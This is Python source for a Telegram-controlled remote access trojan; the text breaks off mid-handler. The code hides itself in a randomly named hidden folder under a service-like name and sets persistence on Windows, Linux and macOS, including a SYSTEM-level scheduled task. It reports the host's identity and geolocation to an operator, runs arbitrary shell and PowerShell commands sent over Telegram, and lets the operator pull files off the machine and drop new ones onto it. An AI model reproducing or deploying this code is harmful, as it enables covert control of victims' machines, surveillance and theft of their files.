# -*- coding: utf-8 -*-
"""
Cross-platform remote administration client (Telegram-controlled).

OVERVIEW
--------
Self-installing Telegram bot that:
  * copies itself into a hidden folder under a per-OS data dir,
  * registers itself in autostart (elevated if possible, per-user otherwise),
  * accepts shell commands from a single admin via Telegram,
  * supports three execution backends:
      - plain text          -> shell (cmd.exe on Windows, sh on Unix)
      - /cmd <text>         -> explicitly cmd.exe / sh
      - /powershell <text>  -> PowerShell (Windows only)
  * can send and receive files (/getfile, /putfile),
  * reports geolocation of the public IP via multiple fallback APIs,
  * never dies on its own (except on invalid/duplicate Telegram token).

Autostart matrix:
  Windows (admin) -> schtasks ONLOGON as SYSTEM with HIGHEST privileges
  Windows (user)  -> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Linux   (root)  -> /etc/systemd/system/<APP>.service
  Linux   (user)  -> ~/.config/autostart/<APP>.desktop
  macOS   (root)  -> /Library/LaunchDaemons/<label>.plist
  macOS   (user)  -> ~/Library/LaunchAgents/<label>.plist

Output encoding note:
  cmd.exe built-in commands ignore `chcp 65001` when their stdout is a
  pipe. So we capture raw bytes and decode with `_dec`, trying UTF-8 first
  and falling back to the system OEM codepage (cp866 on Russian Windows,
  cp437 on US, cp932 on Japanese, ...).
"""

# --------------------------------------------------------------------------- #
# Standard library imports
# --------------------------------------------------------------------------- #
import asyncio          # async runtime — the bot is fully async
import atexit           # last-resort "process exiting" notification
import getpass          # fetch current username
import json             # parse responses from geo-IP APIs
import logging          # silence aiogram's own loggers
import os               # env vars, paths, chmod, low-level exit
import platform         # OS name / release / machine
import random           # random suffix for hidden folder names
import shutil           # copy files
import signal           # SIGINT / SIGTERM / SIGBREAK handlers
import socket           # LAN IP discovery
import string           # alphabet for random folder names
import subprocess       # run shell commands
import sys              # platform detection, stdout reconfiguration
import time             # uptime counter
import urllib.request   # public IP + geo-IP lookups
import uuid             # MAC address via uuid.getnode()
from pathlib import Path  # modern filesystem paths

# --------------------------------------------------------------------------- #
# Third-party imports (aiogram)
# --------------------------------------------------------------------------- #
from aiogram import Bot, Dispatcher, F
from aiogram.exceptions import TelegramConflictError, TelegramUnauthorizedError
from aiogram.filters import Command
from aiogram.types import ErrorEvent, FSInputFile, Message


# =========================================================================== #
# Platform detection
# =========================================================================== #
IS_WIN = sys.platform.startswith("win")
IS_MAC = sys.platform == "darwin"
IS_LINUX = not IS_WIN and not IS_MAC

if IS_WIN:
    # Windows-only modules, imported lazily so Unix runs don't fail.
    import ctypes    # Win32 API for admin check, OEM codepage, H+S attrs
    import winreg    # registry access for install marker / autostart


# =========================================================================== #
# UTF-8 bootstrap
# =========================================================================== #
if IS_WIN:
    # Best-effort: set the console's input/output codepage to UTF-8.
    try:
        _k32 = ctypes.windll.kernel32
        _k32.SetConsoleOutputCP(65001)
        _k32.SetConsoleCP(65001)
    except Exception:
        pass

# Reconfigure Python's text streams so anything we print is UTF-8.
# `errors="replace"` guarantees we never crash on an unencodable char.
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Belt-and-braces: propagate UTF-8 to child Python processes.
os.environ.setdefault("PYTHONIOENCODING", "utf-8")
os.environ.setdefault("PYTHONUTF8", "1")


# =========================================================================== #
# Build-time placeholders (substituted by builder.py)
# =========================================================================== #
TOKEN = "__TOKEN__"          # Telegram bot token
ADMIN_ID = __ADMIN_ID__      # integer Telegram user ID allowed to command
CLIENT_NAME = "__NAME__"     # human-readable name shown in messages

APP_NAME = "WinSvcIMTx32"    # file base name, registry key, task/service label
APP_LABEL = f"com.{APP_NAME}"  # reverse-DNS label for macOS launchd

# Telegram Bot API caps bot uploads at 50 MB. Check locally so we can
# give a clear error instead of letting the API reject the request.
MAX_UPLOAD = 50 * 1024 * 1024

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Silence aiogram's loggers so they don't interleave with our output.
logging.getLogger("aiogram").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)


# =========================================================================== #
# Runtime state
# =========================================================================== #
_start_ts = time.time()      # process start time, used by /heartbeat
_offline = False             # True after a "connection lost" was reported once
_loop = None                 # running event loop, set in main() for signals
_shutdown_done = False       # ensures only ONE shutdown notification per process
_pending_put = None          # directory waiting to receive the next document


# =========================================================================== #
# Generic utilities
# =========================================================================== #
def _rand(n=10):
    """Random lowercase alphanumeric string — used for hidden folder names."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _hide(p):
    """
    Set HIDDEN + SYSTEM attributes on `p` (Windows only).

    FILE_ATTRIBUTE_HIDDEN = 0x02, FILE_ATTRIBUTE_SYSTEM = 0x04.
    The file/folder disappears from Explorer and from `dir` without /a.
    No-op on non-Windows.
    """
    if not IS_WIN:
        return
    try:
        s = str(p)
        a = ctypes.windll.kernel32.GetFileAttributesW(s)
        if a == -1:
            a = 0x80  # FILE_ATTRIBUTE_NORMAL if the query failed
        ctypes.windll.kernel32.SetFileAttributesW(s, a | 0x02 | 0x04)
    except Exception:
        pass


def _write_text(p, t, mode=None):
    """
    Write UTF-8 text to `p`, creating parent dirs, using LF newlines.

    `mode` optionally chmods the file (used for .sh / executables).
    """
    p.parent.mkdir(parents=True, exist_ok=True)
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(t)
    if mode is not None:
        try:
            os.chmod(p, mode)
        except Exception:
            pass


def _oem():
    """
    Return the system OEM codepage as a Python codec name.

    This is what cmd.exe built-ins use when their stdout is a pipe:
    cp866 on Russian Windows, cp437 on US, cp850/852 on Western/Central
    European, cp932 on Japanese, etc.
    """
    try:
        return f"cp{ctypes.windll.kernel32.GetOEMCP()}"
    except Exception:
        return "cp866"  # safe fallback


def _dec(raw):
    """
    Decode raw subprocess output to str.

    Try UTF-8 first (external tools almost always emit UTF-8). If that
    fails, fall back to the system OEM codepage, which is what cmd.exe
    built-ins use when writing to a pipe.
    """
    if not raw:
        return ""
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.decode(_oem(), errors="replace")


class _C:
    """Lightweight subprocess.CompletedProcess replacement with decoded text."""

    def __init__(s, rc, out, err):
        s.returncode = rc
        s.stdout = out
        s.stderr = err


def _run(args, timeout=30):
    """
    Run a subprocess, decode output, never raise.

    On Windows `list2cmdline` joins argv into one command line (we call
    with shell=True). On failure we return rc=-1 with the exception text
    in stderr — callers never need to check for None.
    """
    try:
        if IS_WIN:
            q = subprocess.list2cmdline(args)
            r = subprocess.run(q, shell=True, capture_output=True, timeout=timeout)
        else:
            r = subprocess.run(args, capture_output=True, timeout=timeout)
        return _C(r.returncode, _dec(r.stdout or b""), _dec(r.stderr or b""))
    except Exception as e:
        return _C(-1, "", str(e))


def is_admin():
    """True when running elevated (root on Unix, Administrator on Windows)."""
    try:
        if IS_WIN:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


# =========================================================================== #
# Per-OS directory selection
# =========================================================================== #
def _config_dir():
    """Per-user config directory (used for the install marker on Unix)."""
    if IS_WIN:
        b = os.environ.get("APPDATA") or os.path.expanduser("~")
    elif IS_MAC:
        b = os.path.expanduser("~/Library/Application Support")
    else:
        b = os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")
    return Path(b) / APP_NAME


def _data_dir():
    """
    Writable directory where the installed copy lives.

    Preference:
      * elevated -> system-wide location (ProgramData, /opt, /Library/...)
      * regular  -> per-user writable location (LOCALAPPDATA, ~/.local/share)
    """
    if IS_WIN:
        if is_admin():
            return Path(os.environ.get("PROGRAMDATA", r"C:\ProgramData"))
        return Path(
            os.environ.get("LOCALAPPDATA")
            or os.environ.get("APPDATA")
            or os.path.expanduser("~")
        )
    if IS_MAC:
        if is_admin():
            return Path("/Library/Application Support")
        return Path(os.path.expanduser("~/Library/Application Support"))
    # Linux
    if is_admin():
        return Path("/opt")
    b = os.environ.get("XDG_DATA_HOME") or os.path.expanduser("~/.local/share")
    return Path(b)


# =========================================================================== #
# Install marker I/O
# =========================================================================== #
# The marker records where we've installed, making install_self idempotent.
# Windows: HKCU\Software\<APP>\LaunchPath
# Unix:    ~/.config/<APP>/install_path
def _marker_file():
    """Path of the marker file on Unix (unused on Windows)."""
    return _config_dir() / "install_path"


def _read_install_path():
    """Return the recorded install path if it still exists, else None."""
    try:
        if IS_WIN:
            k = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}", 0, winreg.KEY_READ
            )
            v, _ = winreg.QueryValueEx(k, "LaunchPath")
            winreg.CloseKey(k)
        else:
            v = _marker_file().read_text(encoding="utf-8").strip()
        return v if v and os.path.exists(v) else None
    except Exception:
        return None


def _save_install_path(p):
    """Persist the install path into the registry (Win) or marker file (Unix)."""
    try:
        if IS_WIN:
            k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}")
            winreg.SetValueEx(k, "LaunchPath", 0, winreg.REG_SZ, p)
            winreg.CloseKey(k)
        else:
            _write_text(_marker_file(), p)
    except Exception:
        pass


def _clear_install_path():
    """Remove the install marker (used on uninstall)."""
    try:
        if IS_WIN:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\{APP_NAME}")
        else:
            _marker_file().unlink(missing_ok=True)
    except Exception:
        pass


# =========================================================================== #
# Launcher wrapper
# =========================================================================== #
def _make_launcher(folder, script):
    """
    Create a silent launcher for a .py copy.

    Windows -> .vbs that invokes pythonw.exe (no console window).
    Unix    -> .sh with a shebang that execs the current interpreter.
    Only used for script installs; binaries run directly.
    """
    if IS_WIN:
        pyw = Path(sys.executable).with_name("pythonw.exe")
        if not pyw.exists():
            pyw = Path(sys.executable)
        l = folder / f"{APP_NAME}.vbs"
        _write_text(
            l,
            'Set sh = CreateObject("WScript.Shell")\n'
            + f'sh.Run """{pyw}"" ""{script}""", 0, False\n',
        )
        _hide(l)
    else:
        l = folder / f"{APP_NAME}.sh"
        _write_text(
            l,
            "#!/bin/sh\n" + f'exec "{sys.executable}" "{script}" "$@"\n',
            mode=0o755,
        )
    return l


# =========================================================================== #
# Self-install
# =========================================================================== #
def install_self():
    """
    Copy ourselves into a hidden random folder and return the launch target.

    Idempotent: if the marker points to an existing file, return it as-is.
    On any failure return the currently running script/binary path so the
    rest of the program still has something usable.
    """
    s = _read_install_path()
    if s:
        return s
    try:
        fr = getattr(sys, "frozen", False)
        src = Path(sys.executable if fr else __file__).resolve()
        ext = ".exe" if fr and IS_WIN else ("" if fr else ".py")

        base = _data_dir()
        folder = base / f".{_rand(10)}"
        try:
            folder.mkdir(parents=True, exist_ok=True)
        except Exception:
            folder = Path.home() / f".{_rand(10)}"
            folder.mkdir(parents=True, exist_ok=True)
        _hide(folder)

        dst = folder / f"{APP_NAME}{ext}"
        if src.resolve() != dst.resolve():
            shutil.copy2(src, dst)
        _hide(dst)

        # On Unix make the copied .py executable.
        if not fr and not IS_WIN:
            try:
                os.chmod(dst, 0o755)
            except Exception:
                pass

        # Binaries are the target; .py needs a silent launcher wrapper.
        l = dst if fr else _make_launcher(folder, dst)
        _save_install_path(str(l))
        return str(l)
    except Exception:
        return str(
            Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        )


# =========================================================================== #
# Autostart: Windows
# =========================================================================== #
def _autostart_windows(t):
    """
    Elevated -> scheduled task ONLOGON as SYSTEM with HIGHEST privileges.
                Runs for every user, elevated, without UAC prompts.
    Non-elev -> HKCU\\...\\Run value (current user, non-elevated).
    """
    if is_admin():
        tr = f'"{t}"' if " " in t else t
        r = _run(
            [
                "schtasks",
                "/Create",
                "/TN", APP_NAME,
                "/TR", tr,
                "/SC", "ONLOGON",
                "/RL", "HIGHEST",
                "/RU", "SYSTEM",
                "/F",
            ]
        )
        return (
            f"✅ [all-users] {APP_NAME} → {t}"
            if r.returncode == 0
            else f"⚠️ schtasks: {(r.stderr or r.stdout).strip()}"
        )
    try:
        k = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, t)
        winreg.CloseKey(k)
        return f"✅ [current-user] HKCU\\Run → {t}"
    except Exception as e:
        return f"⚠️ reg: {e}"


# =========================================================================== #
# Autostart: Linux
# =========================================================================== #
def _autostart_linux(t):
    """
    Root -> systemd system unit, enable + start now.
    User -> XDG autostart .desktop file.
    Restart=always ensures the process is respawned on crash.
    """
    if is_admin():
        unit = (
            "[Unit]\n"
            f"Description={APP_NAME}\n"
            "After=network-online.target\n"
            "Wants=network-online.target\n\n"
            "[Service]\n"
            "Type=simple\n"
            f"ExecStart={t}\n"
            "Restart=always\n"
            "RestartSec=10\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )
        up = Path(f"/etc/systemd/system/{APP_NAME}.service")
        try:
            _write_text(up, unit, mode=0o644)
            _run(["systemctl", "daemon-reload"])
            _run(["systemctl", "enable", "--now", f"{APP_NAME}.service"])
            return f"✅ [systemd] {APP_NAME} → {t}"
        except Exception as e:
            return f"⚠️ systemd: {e}"

    ad = Path(
        os.environ.get("XDG_CONFIG_HOME") or os.path.expanduser("~/.config")
    ) / "autostart"
    d = (
        "[Desktop Entry]\n"
        "Type=Application\n"
        f"Name={APP_NAME}\n"
        f"Exec={t}\n"
        "Terminal=false\n"
        "X-GNOME-Autostart-enabled=true\n"
    )
    try:
        _write_text(ad / f"{APP_NAME}.desktop", d, mode=0o644)
        return f"✅ [xdg-autostart] {APP_NAME} → {t}"
    except Exception as e:
        return f"⚠️ desktop: {e}"


# =========================================================================== #
# Autostart: macOS
# =========================================================================== #
def _autostart_macos(t):
    """
    Root -> LaunchDaemon in /Library/LaunchDaemons (runs as root at boot).
    User -> LaunchAgent in ~/Library/LaunchAgents (runs as user at login).
    KeepAlive=true -> launchd respawns the process if it dies.
    """
    pl = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0">\n'
        '<dict>\n'
        f'  <key>Label</key><string>{APP_LABEL}</string>\n'
        '  <key>ProgramArguments</key>\n'
        f'  <array><string>{t}</string></array>\n'
        '  <key>RunAtLoad</key><true/>\n'
        '  <key>KeepAlive</key><true/>\n'
        '</dict>\n'
        '</plist>\n'
    )
    pd = (
        Path("/Library/LaunchDaemons")
        if is_admin()
        else Path(os.path.expanduser("~/Library/LaunchAgents"))
    )
    pp = pd / f"{APP_LABEL}.plist"
    try:
        _write_text(pp, pl, mode=0o644)
        # Unload first in case an older version is registered.
        _run(["launchctl", "unload", str(pp)])
        r = _run(["launchctl", "load", "-w", str(pp)])
        if r.returncode != 0:
            return f"⚠️ launchctl: {(r.stderr or r.stdout).strip()}"
        return f"✅ [{'daemon' if is_admin() else 'agent'}] {APP_LABEL} → {t}"
    except Exception as e:
        return f"⚠️ plist: {e}"


# =========================================================================== #
# Autostart dispatcher
# =========================================================================== #
def autostart_install():
    """Install ourselves + register autostart; returns a status string."""
    try:
        t = install_self()
        if IS_WIN:
            return _autostart_windows(t)
        if IS_MAC:
            return _autostart_macos(t)
        return _autostart_linux(t)
    except Exception as e:
        return f"⚠️ install err: {e}"


# =========================================================================== #
# Geolocation via public IP (multi-API with fallbacks)
# =========================================================================== #
def _flag(cc):
    """
    Convert a 2-letter ISO country code into its flag emoji.

    Uses Unicode regional indicator symbols: each letter A-Z maps to
    U+1F1E6..U+1F1FF, and two in a row form the flag. Falls back to a
    neutral white flag if the input is empty or malformed.
    """
    if not cc or len(cc) != 2:
        return "🏳️"
    try:
        return "".join(chr(0x1F1E6 + ord(c.upper()) - 65) for c in cc)
    except Exception:
        return "🏳️"


def get_geo_info():
    """
    Resolve the public IP to a country/city/coordinates via fallback APIs.

    Each entry is (url, keys) where keys are the JSON field names in order:
        (ip, country_code, country_name, city, latitude, longitude)
    Any key may be None if the API does not provide that field. The first
    API that returns a usable `ip` wins; the rest are skipped.

    Returns a multi-line "🌍 Public IP / flag country, city (lat, lon)"
    string, or "unknown" if every provider failed (offline, all blocked).
    """
    apis = [
        ("https://ipwho.is/",                       ("ip", "country_code", "country", "city", "latitude", "longitude")),
        ("https://ipapi.co/json/",                  ("ip", "country_code", "country_name", "city", "latitude", "longitude")),
        ("https://freeipapi.com/api/json",          ("ipAddress", "countryCode", "countryName", "cityName", "latitude", "longitude")),
        ("https://get.geojs.io/v1/ip/geo.json",     ("ip", "country_code", "country", "city", "latitude", "longitude")),
        ("https://api.ip.sb/geoip",                 ("ip", "country_code", "country", "city", "latitude", "longitude")),
        ("http://ipwhois.app/json/",                ("ip", "country_code", "country", "city", "latitude", "longitude")),
        ("http://ip-api.com/json/",                 ("query", "countryCode", "country", "city", "lat", "lon")),
        ("https://ipinfo.io/json",                  ("ip", "country", "country", "city", None, None)),
        ("https://api.myip.com",                    ("ip", "cc", "country", None, None, None)),
    ]
    for url, keys in apis:
        try:
            with urllib.request.urlopen(url, timeout=6) as r:
                d = json.loads(r.read().decode("utf-8", errors="replace"))
            ip = d.get(keys[0])
            if not ip:
                continue
            cc = d.get(keys[1]) or ""
            country = d.get(keys[2]) or "?"
            city = d.get(keys[3]) or "?"
            lat = d.get(keys[4]) if keys[4] else None
            lon = d.get(keys[5]) if keys[5] else None
            coords = (
                f" ({lat}, {lon})"
                if lat is not None and lon is not None
                else ""
            )
            return f"🌍 Public IP: {ip}\n{_flag(cc)} {country}, {city}{coords}"
        except Exception:
            pass
    return "🌍 Public IP: unknown"


# =========================================================================== #
# System information gathering
# =========================================================================== #
def get_public_ip():
    """Query a few services for the external IP; 'unknown' on total failure."""
    for u in (
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
    ):
        try:
            with urllib.request.urlopen(u, timeout=5) as r:
                return r.read().decode("utf-8", errors="replace").strip()
        except Exception:
            pass
    return "unknown"


def get_local_ip():
    """LAN IP by opening a UDP socket toward 8.8.8.8 (no packets sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def get_mac():
    """Primary MAC address as 12 uppercase hex digits."""
    try:
        return f"{uuid.getnode():012X}"
    except Exception:
        return "unknown"


def get_device_info():
    """
    Human-readable snapshot of the current host.

    Includes hostname, user, OS, arch, LAN IP, geolocated public IP,
    MAC, CWD, install path, admin flag, and platform tag.
    """
    try:
        u = getpass.getuser()
    except Exception:
        u = "unknown"
    try:
        return "\n".join([
            f"🖥 Host: {platform.node()}",
            f"👤 User: {u}",
            f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",
            f"🏗 Architecture: {platform.machine()}",
            f"🌐 Local IP: {get_local_ip()}",
            get_geo_info(),
            f"🔗 MAC: {get_mac()}",
            f"📁 CWD: {os.getcwd()}",
            f"📂 Installed: {_read_install_path() or '❌'}",
            f"🛡 Admin: {is_admin()}",
            f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",
            f"\n",
            f"Type /help to see command list.",
        ])
    except Exception as e:
        return f"[device info error: {e}]"


async def build_online_message():
    """
    Async wrapper — get_device_info does blocking network I/O, so it is
    offloaded to a worker thread to keep the event loop responsive.
    """
    try:
        i = await asyncio.to_thread(get_device_info)
    except Exception as e:
        i = f"[info err: {e}]"
    return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{i}"


# =========================================================================== #
# Command execution
# =========================================================================== #
def run_cmd(c):
    """
    Default shell execution — used for plain text messages.

    Windows: `shell=True` uses cmd.exe. Unix: uses /bin/sh.
    No timeout — long-running commands are allowed to complete. This is
    a deliberate trade-off: `tail -f` or `ping -t` won't be killed, but
    they'll block a worker thread until done.
    """
    try:
        r = subprocess.run(c, shell=True, capture_output=True)
        o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return o or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def run_cmd_cmdline(c):
    """
    Explicit cmd.exe / sh execution — used by /cmd.

    Windows: invokes cmd.exe /c so built-ins like `dir`, `set`, `copy`
    behave identically to running them from a console.
    Unix:    falls back to shell=True (same as run_cmd).
    """
    try:
        if IS_WIN:
            r = subprocess.run(["cmd.exe", "/c", c], capture_output=True)
        else:
            r = subprocess.run(c, shell=True, capture_output=True)
        o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return o or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def run_cmd_ps(c):
    """
    PowerShell execution — used by /powershell.

    Windows-only. Runs PowerShell with -NoProfile (ignore user profile)
    and -NonInteractive (no prompts, no reading from console) so that
    scripts that expect a human do not hang the worker thread.
    """
    if not IS_WIN:
        return "[powershell] only supported on Windows"
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", c],
            capture_output=True,
        )
        o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
        return o or f"[empty, rc={r.returncode}]"
    except Exception as e:
        return f"[error: {e}]"


def split_msg(t, l=4000):
    """Yield chunks of at most `l` chars — Telegram caps messages at ~4096."""
    for i in range(0, len(t), l):
        yield t[i:i + l]


def is_adm(m):
    """True if the message came from the configured admin."""
    try:
        return bool(m.from_user and m.from_user.id == ADMIN_ID)
    except Exception:
        return False


# =========================================================================== #
# Shutdown notifications (signals + atexit backstop)
# =========================================================================== #
async def _safe_send(t):
    """Best-effort admin notification — any failure is silently ignored."""
    try:
        await bot.send_message(ADMIN_ID, t)
    except Exception:
        pass


async def _send_and_exit(t):
    """Send the shutdown message, give it a moment to flush, then exit."""
    await _safe_send(t)
    await asyncio.sleep(0.3)
    os._exit(0)


def _on_signal(signum, frame):
    """
    Sync handler for SIGINT / SIGTERM / SIGBREAK.

    Schedules an async shutdown on the running event loop via
    `run_coroutine_threadsafe`. Falls back to hard exit if the loop is
    unavailable (e.g. during early startup).
    """
    global _shutdown_done
    if _shutdown_done:
        return
    _shutdown_done = True
    try:
        if _loop and not _loop.is_closed():
            asyncio.run_coroutine_threadsafe(
                _send_and_exit(f"⚠️ [{CLIENT_NAME}] shutting down (signal {signum})"),
                _loop,
            )
            return
    except Exception:
        pass
    os._exit(0)


def _on_exit():
    """
    atexit backstop — fires on normal process end (main returned cleanly).
    Skipped if a signal handler already notified the admin.
    """
    global _shutdown_done
    if _shutdown_done:
        return
    _shutdown_done = True
    try:
        asyncio.run(_safe_send(f"⚠️ [{CLIENT_NAME}] process exiting"))
    except Exception:
        pass


atexit.register(_on_exit)
for _sg in (signal.SIGINT, signal.SIGTERM):
    try:
        signal.signal(_sg, _on_signal)
    except Exception:
        pass
if IS_WIN:
    try:
        signal.signal(signal.SIGBREAK, _on_signal)
    except Exception:
        pass


# =========================================================================== #
# aiogram handlers
# =========================================================================== #
@dp.errors()
async def _on_error(e):
    """Global error sink. Returning True keeps the dispatcher alive."""
    return True


@dp.message(Command("start"))
async def cmd_start(m):
    """/start — send host info + geolocation to the admin."""
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        await m.answer(await build_online_message())
    except Exception:
        pass


@dp.message(Command("help"))
async def cmd_help(m):
    """
    /help — print the list of available commands.

    Sent as plain text (no Markdown) so paths with backticks or
    parentheses in examples cannot break the parser.
    """
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        await m.answer(
            f"📖 [{CLIENT_NAME}] commands\n\n"
            f"/start — host info + geo\n"
            f"/heartbeat — liveness probe (uptime, PID, offline flag)\n"
            f"/help — this message\n"
            f"/getfile <path> — download a file from the target\n"
            f"    example: /getfile C:\\Users\\Public\\log.txt\n"
            f"/putfile <dir> — upload a file from Telegram into <dir>\n"
            f"    example: /putfile C:\\Users\\Public\n"
            f"    (bot will then ask you to send the file)\n"
            f"/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n"
            f"    example: /cmd dir\n"
            f"/powershell <command> — run via PowerShell (Windows only)\n"
            f"    example: /powershell Get-Process | Select -First 5\n\n"
            f"anything else — shell command (no timeout)\n"
            f"    example: dir\n"
            f"    example: ps aux | head\n\n"
            f"limits:\n"
            f"  • max upload: {MAX_UPLOAD // (1024 * 1024)} MB per file"
        )
    except Exception:
        pass


@dp.message(Command("getfile"))
async def cmd_getfile(m):
    """
    /getfile <path> — send a file from the target to the admin.

    Validates the path locally (exists, not a directory, not empty,
    not above the 50 MB Telegram limit) before hitting the API.
    """
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")

        r = (m.text or "").strip()
        p_ = r.split(maxsplit=1)
        if len(p_) < 2 or not p_[1].strip():
            return await m.answer(
                "usage: /getfile <path>\n"
                "example: /getfile C:\\Users\\Public\\log.txt\n"
                "example: /getfile /etc/passwd"
            )

        p = Path(p_[1].strip().strip('"').strip("'"))
        if not p.exists():
            return await m.answer(f"❌ not found: {p}")
        if p.is_dir():
            return await m.answer(f"❌ is a directory, not a file: {p}")
        try:
            s = p.stat().st_size
        except Exception as e:
            return await m.answer(f"❌ cannot stat: {e}")
        if s == 0:
            return await m.answer(f"❌ empty file: {p}")
        if s > MAX_UPLOAD:
            return await m.answer(
                f"❌ file too large: {s/1024/1024:.1f} MB "
                f"(limit {MAX_UPLOAD // (1024 * 1024)} MB)"
            )

        try:
            d = FSInputFile(str(p), filename=p.name)
            await m.answer_document(d, caption=f"[{CLIENT_NAME}] {p}")
        except Exception as e:
            try:
                await m.answer(f"❌ upload failed: {e}")
            except Exception:
                pass
    except Exception:
        pass


@dp.message(Command("putfile"))
async def cmd_putfile(m):
    """
    /putfile <dir> — arm a one-shot receive mode.

    The next document the admin sends will be saved into <dir> under its
    original filename, then the pending state is cleared.
    """
    global _pending_put
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")

        r = (m.text or "").strip()
        p_ = r.split(maxsplit=1)
        if len(p_) < 2 or not p_[1].strip():
            return await m.answer(
                "usage: /putfile <target_directory>\n"
                "example: /putfile C:\\Users\\Public\n"
                "example: /putfile /tmp"
            )

        d = Path(p_[1].strip().strip('"').strip("'"))
        if not d.exists():
            return await m.answer(f"❌ directory not found: {d}")
        if not d.is_dir():
            return await m.answer(f"❌ not a directory: {d}")

        _pending_put = str(d)
        await m.answer(
            f"📤 send me the file to save into:\n{d}\n\n"
            f"(send as a document, not as a photo)"
        )
    except Exception:
        pass


@dp.message(F.document)
async def cmd_putrecv(m):
    """
    Receive a document while /putfile is pending.

    Filename is sanitized: backslashes normalized to forward slashes,
    then `basename` applied, so `../../etc/passwd` becomes `passwd`.
    """
    global _pending_put
    try:
        if not is_adm(m):
            return
        if not _pending_put:
            return

        d = Path(_pending_put)
        _pending_put = None  # consume, one-shot

        fn = (m.document.file_name or "").replace("\\", "/")
        fn = os.path.basename(fn) or f"upload_{_rand(8)}"
        dst = d / fn

        try:
            await bot.download(m.document, destination=dst)
        except Exception as e:
            return await m.answer(f"❌ download failed: {e}")

        try:
            s = dst.stat().st_size
        except Exception:
            s = 0
        await m.answer(f"✅ saved: {dst}\n📦 {s} bytes")
    except Exception as e:
        try:
            await m.answer(f"❌ putfile err: {e}")
        except Exception:
            pass


@dp.message(Command("heartbeat"))
async def cmd_heartbeat(m):
    """Liveness probe: uptime, PID, offline flag, admin status, platform."""
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        up = int(time.time() - _start_ts)
        h, rem = divmod(up, 3600)
        mn, sc = divmod(rem, 60)
        await m.answer(
            f"💓 [{CLIENT_NAME}] alive\n"
            f"⏱ uptime: {h}h {mn}m {sc}s\n"
            f"🆔 pid: {os.getpid()}\n"
            f"📡 offline flag: {_offline}\n"
            f"🛡 admin: {is_admin()}\n"
            f"🐧 platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}"
        )
    except Exception:
        pass


@dp.message(Command("cmd"))
async def cmd_cmd(m):
    """
    /cmd <command> — run explicitly through cmd.exe (Windows) / sh (Unix).

    Registered before F.text so the /cmd prefix isn't captured by the
    catch-all text handler.
    """
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        parts = (m.text or "").strip().split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
        o = await asyncio.to_thread(run_cmd_cmdline, parts[1].strip())
        for ch in split_msg(o):
            try:
                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {ch}")
                except Exception:
                    pass
    except Exception:
        pass


@dp.message(Command("powershell"))
async def cmd_ps(m):
    """
    /powershell <command> — run through PowerShell (Windows only).

    Uses -NoProfile -NonInteractive so scripts that prompt for input
    do not hang the worker thread.
    """
    try:
        if not is_adm(m):
            return await m.answer("⛔ Access denied")
        parts = (m.text or "").strip().split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            return await m.answer(
                "usage: /powershell <command>\n"
                "example: /powershell Get-Process | Select -First 5"
            )
        o = await asyncio.to_thread(run_cmd_ps, parts[1].strip())
        for ch in split_msg(o):
            try:
                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
            except Exception:
                try:
                    await m.answer(f"[{CLIENT_NAME}] {ch}")
                except Exception:
                    pass
    except Exception:
        pass


@dp.message(F.text)
async def cmd_exec(m):
    """
    Catch-all text handler — anything not matched above is a shell command.

    Executed in a worker thread (asyncio.to_thread) so the event loop
    stays responsive even when the command runs for a long time.
    Output is chunked and sent as Markdown code fences, with a
    plain-text fallback if Markdown parsing fails.
    """
    try:
